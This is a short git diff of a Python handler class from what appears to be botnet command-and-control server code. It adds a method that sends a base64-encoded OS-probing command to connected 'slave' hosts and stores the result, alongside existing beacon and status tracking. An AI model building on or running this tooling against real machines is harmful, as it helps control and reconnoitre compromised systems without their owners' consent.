@@ -20,6 +20,7 @@ class Handler(threading.Thread):
         self.bot_id = bot_id
         self.info = [self.bot_id,self.ip,self.port]
         self.beacon_wait = False
+        self.os = ''
         self.status = ["UP","UP"]                           # <--UP - DOWN - ERR 
                                                             # [0] = PING, [1] = BEACON
 
@@ -34,6 +35,9 @@ class Handler(threading.Thread):
         #self.BotName = threading.current_thread().getName()
 
         print(f"[*BotHandler-Msg] Slave {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")
+
+        # Grab operating system : Linux/Windows
+        self.setOS()
 
         # Beacon indefinitely??
         self.beacon()
@@ -84,6 +88,12 @@ class Handler(threading.Thread):
     def setStatus(self, index0, index1):
         self.status[0] = index0
         self.status[1] = index1
+
+    def setOS(self):
+        self.os = self.execute("UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt")
+        
+    def getOS(self):
+        return self.os
 
     def getInfo(self):
         return self.info
